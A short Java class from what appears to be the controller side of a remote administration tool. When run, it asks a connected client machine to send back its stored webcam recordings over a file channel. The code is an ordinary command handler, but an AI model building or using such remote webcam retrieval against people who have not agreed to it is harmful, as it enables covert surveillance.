package GUI.TableUtils.Webcam.WebcamManager.Events;

import Connections.BytesChannel;
import Connections.Category;
import GUI.TableUtils.Webcam.WebcamManager.WebcamGUI;
import org.json.JSONObject;

import java.io.IOException;

public class SaveRecordEvent extends WebcamEvent {
    public SaveRecordEvent(WebcamGUI webcamGUI) {
        super(webcamGUI);
    }

    @Override
    public void run() {
        BytesChannel bytesChannel = getClient().createFileChannel(Category.WEBCAM_LOGS);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", "SEND_WEBCAM_RECORDS");
        jsonObject.put("channel_id", bytesChannel.getId());
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
